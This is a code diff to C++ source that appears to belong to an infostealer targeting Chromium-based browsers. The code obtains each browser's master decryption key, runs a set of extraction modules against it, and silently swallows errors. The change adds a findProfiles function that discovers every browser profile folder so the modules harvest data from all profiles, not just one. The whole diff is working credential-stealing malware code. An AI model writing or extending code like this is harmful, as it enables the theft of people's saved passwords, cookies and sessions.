@@ -53,21 +53,27 @@ void ChromiumBrowsers::execute(fs::path &root) {
             if(master_key.empty())
                 return;
 
+            std::vector<std::string> profiles = ChromiumBrowsers::findProfiles(browser.second);
+
             for(ChromiumBrowserModule* module : this->modules)
             {
                 module->setMasterKey(master_key);
-                moduleThreads.emplace_back([module, &browser, &browserRoot, &master_key]() {
-                    try
+                moduleThreads.emplace_back([module, &browser, &browserRoot, &profiles]() {
+                    for(std::string &profile : profiles)
                     {
-                        module->execute(browserRoot, browser.first, browser.second);
+                        try
+                        {
+                            module->setProfile(profile);
+                            module->execute(browserRoot, browser.first, browser.second);
+                        }
+                        catch (const std::exception& e)
+                        {
+                            #if DEV
+                                std::cerr << "DEBUG ERROR: " << e.what() << std::endl;
+                            #endif
+                        }
+                        catch (...){}
                     }
-                    catch (const std::exception& e)
-                    {
-                        #if DEV
-                            std::cerr << "DEBUG ERROR: " << e.what() << std::endl;
-                        #endif
-                    }
-                    catch (...){}
                 });
             }
 
@@ -84,4 +90,28 @@ void ChromiumBrowsers::execute(fs::path &root) {
             thread.join();
         }
     }
+}
+
+std::vector<std::string> ChromiumBrowsers::findProfiles(const fs::path &path) {
+    std::vector<std::string> profiles;
+
+    for (const auto& entry : fs::directory_iterator(path)) {
+        if (fs::is_directory(entry.path())) {
+            bool found = false;
+            for (const auto& sub_entry : fs::directory_iterator(entry.path())) {
+                std::string filename = sub_entry.path().filename().string();
+
+                if (StringUtil::endswith(filename, "Profile.ico") ||
+                    StringUtil::endswith(filename, "LOG")) {
+                    found = true;
+                    break;
+                }
+            }
+            if (found) {
+                profiles.push_back(entry.path().filename().string());
+            }
+        }
+    }
+
+    return profiles;
 }
